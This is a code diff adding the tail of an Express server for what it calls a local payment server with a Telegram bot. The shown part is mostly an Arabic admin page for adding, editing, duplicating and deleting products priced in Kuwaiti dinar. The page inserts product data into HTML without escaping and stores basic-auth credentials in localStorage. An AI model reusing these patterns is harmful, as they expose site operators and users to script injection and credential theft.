+    </div>
+
+    <script>
+        let authHeader = '';
+        let editingProductId = null;
+
+        // تسجيل الدخول
+        function login() {
+            const username = prompt('اسم المستخدم:');
+            if (!username) return;
+            
+            const password = prompt('كلمة المرور:');
+            if (!password) return;
+            
+            authHeader = 'Basic ' + btoa(username + ':' + password);
+            localStorage.setItem('authHeader', authHeader);
+            loadProducts();
+        }
+
+        // التحقق من المصادقة
+        if (!localStorage.getItem('authHeader')) {
+            login();
+        } else {
+            authHeader = localStorage.getItem('authHeader');
+        }
+
+        // تحميل المنتجات
+        async function loadProducts() {
+            try {
+                const response = await fetch('/api/products');
+                const result = await response.json();
+                
+                if (!result.success) {
+                    showAlert('خطأ في تحميل المنتجات', 'danger');
+                    return;
+                }
+
+                document.getElementById('loading').classList.remove('show');
+                const container = document.getElementById('products-container');
+                container.innerHTML = '';
+
+                if (result.data.length === 0) {
+                    container.innerHTML = '<div class="col-12"><p class="text-center">لا توجد منتجات حتى الآن</p></div>';
+                    return;
+                }
+
+                result.data.forEach(product => {
+                    const card = document.createElement('div');
+                    card.className = 'col-md-6 col-lg-4';
+                    card.innerHTML = '<div class="product-card"><img src="' + (product.image_url || 'https://via.placeholder.com/300') + '" class="product-image" alt="' + product.name + '" /><div class="product-body"><div class="product-title">' + product.name + '</div><div class="product-price">' + product.price + ' د.ك</div><small class="text-muted">' + (product.category || 'بدون فئة') + '</small><div class="btn-group"><button class="btn btn-primary btn-sm" onclick="editProduct(' + product.id + ')"><i class="fas fa-edit"></i> تعديل</button><button class="btn btn-success btn-sm" onclick="duplicateProduct(' + product.id + ')"><i class="fas fa-copy"></i> تكرار</button><button class="btn btn-danger btn-sm" onclick="deleteProduct(' + product.id + ')"><i class="fas fa-trash"></i> حذف</button></div></div></div>';
+                    container.appendChild(card);
+                });
+            } catch (error) {
+                console.error('خطأ:', error);
+                showAlert('خطأ في التواصل مع الخادم', 'danger');
+            }
+        }
+
+        // إضافة/تعديل منتج
+        document.getElementById('product-form').addEventListener('submit', async (e) => {
+            e.preventDefault();
+
+            const formData = new FormData();
+            formData.append('name', document.getElementById('name').value);
+            formData.append('description', document.getElementById('description').value);
+            formData.append('price', document.getElementById('price').value);
+            formData.append('previous_price', document.getElementById('previous_price').value);
+            formData.append('discount', document.getElementById('discount').value);
+            formData.append('category', document.getElementById('category').value);
+            
+            const imageFile = document.getElementById('image').files[0];
+            if (imageFile) {
+                formData.append('image', imageFile);
+            }
+
+            try {
+                const productId = document.getElementById('product-id').value;
+                const method = productId ? 'PUT' : 'POST';
+                const url = productId ? '/api/products/' + productId : '/api/products';
+
+                const response = await fetch(url, {
+                    method: method,
+                    headers: { 'Authorization': authHeader },
+                    body: formData
+                });
+
+                const result = await response.json();
+
+                if (result.success) {
+                    showAlert(result.message, 'success');
+                    resetForm();
+                    loadProducts();
+                } else {
+                    showAlert(result.message, 'danger');
+                    if (response.status === 401 || response.status === 403) {
+                        localStorage.removeItem('authHeader');
+                        login();
+                    }
+                }
+            } catch (error) {
+                console.error('خطأ:', error);
+                showAlert('خطأ في الإرسال', 'danger');
+            }
+        });
+
+        // تعديل منتج
+        async function editProduct(id) {
+            const response = await fetch('/api/products');
+            const result = await response.json();
+            const product = result.data.find(p => p.id === id);
+
+            if (!product) {
+                showAlert('لم يتم العثور على المنتج', 'danger');
+                return;
+            }
+
+            document.getElementById('product-id').value = product.id;
+            document.getElementById('name').value = product.name;
+            document.getElementById('description').value = product.description;
+            document.getElementById('price').value = product.price;
+            document.getElementById('previous_price').value = product.previous_price;
+            document.getElementById('discount').value = product.discount;
+            document.getElementById('category').value = product.category;
+
+            if (product.image_url) {
+                document.getElementById('image-preview').innerHTML = '<img src="' + product.image_url + '" style="max-height: 150px;" />';
+            }
+
+            document.getElementById('form-title').textContent = '✏️ تعديل المنتج';
+            editingProductId = id;
+
+            document.querySelector('html, body').scrollTop = 0;
+        }
+
+        // حذف منتج
+        async function deleteProduct(id) {
+            if (!confirm('هل أنت متأكد من حذف هذا المنتج؟')) return;
+
+            try {
+                const response = await fetch('/api/products/' + id, {
+                    method: 'DELETE',
+                    headers: { 'Authorization': authHeader }
+                });
+
+                const result = await response.json();
+
+                if (result.success) {
+                    showAlert('تم حذف المنتج', 'success');
+                    loadProducts();
+                } else {
+                    showAlert(result.message, 'danger');
+                }
+            } catch (error) {
+                showAlert('خطأ في الحذف', 'danger');
+            }
+        }
+
+        // تكرار منتج
+        async function duplicateProduct(id) {
+            try {
+                const response = await fetch('/api/products/' + id + '/duplicate', {
+                    method: 'POST',
+                    headers: { 'Authorization': authHeader }
+                });
+
+                const result = await response.json();
+
+                if (result.success) {
+                    showAlert('تم تكرار المنتج', 'success');
+                    loadProducts();
+                } else {
+                    showAlert(result.message, 'danger');
+                }
+            } catch (error) {
+                showAlert('خطأ في التكرار', 'danger');
+            }
+        }
+
+        // حذف جميع المنتجات
+        async function clearAllProducts() {
+            if (!confirm('⚠️ هل أنت متأكد من حذف جميع المنتجات؟ هذه العملية لا يمكن استرجاعها!')) return;
+
+            try {
+                const response = await fetch('/api/products', {
+                    method: 'DELETE',
+                    headers: { 'Authorization': authHeader }
+                });
+
+                const result = await response.json();
+
+                if (result.success) {
+                    showAlert('تم حذف جميع المنتجات', 'success');
+                    loadProducts();
+                } else {
+                    showAlert(result.message, 'danger');
+                }
+            } catch (error) {
+                showAlert('خطأ في الحذف', 'danger');
+            }
+        }
+
+        // إعادة تعيين النموذج
+        function resetForm() {
+            document.getElementById('product-form').reset();
+            document.getElementById('product-id').value = '';
+            document.getElementById('form-title').textContent = '➕ إضافة منتج جديد';
+            document.getElementById('image-preview').innerHTML = '';
+            editingProductId = null;
+        }
+
+        // عرض رسالة تنبيه
+        function showAlert(message, type) {
+            const alert = document.createElement('div');
+            alert.className = 'alert alert-' + type;
+            alert.innerHTML = '<button type="button" class="btn-close" onclick="this.parentElement.remove()"></button>' + message;
+            document.getElementById('alert-container').appendChild(alert);
+
+            setTimeout(() => {
+                alert.remove();
+            }, 5000);
+        }
+
+        // تسجيل الخروج
+        function logout() {
+            localStorage.removeItem('authHeader');
+            location.reload();
+        }
+
+        // تحميل المنتجات عند فتح الصفحة
+        loadProducts();
+    </script>
+</body>
+</html>
+`;
+}
+
+// ==================== رسالة البدء ====================
+app.listen(PORT, () => {
+    console.log(\`
+╔════════════════════════════════════════╗
+║  🚀 خادم الدفع المحلي قيد التشغيل       ║
+║  الموقع: http://localhost:\${PORT}       ║
+║  لوحة التحكم: http://localhost:\${PORT}/admin  ║
+║  إدارة المنتجات: http://localhost:\${PORT}/admin-products  ║
+║  Telegram Bot: متصل ✅                  ║
+╚════════════════════════════════════════╝
+    \`);
+});
+
+// معالجة الأخطاء العامة
+process.on('uncaughtException', (error) => {
+    console.error('❌ خطأ غير متوقع:', error);
+});
+
+process.on('unhandledRejection', (reason, promise) => {
+    console.error('❌ رفض الوعد بدون معالجة:', reason);
+});
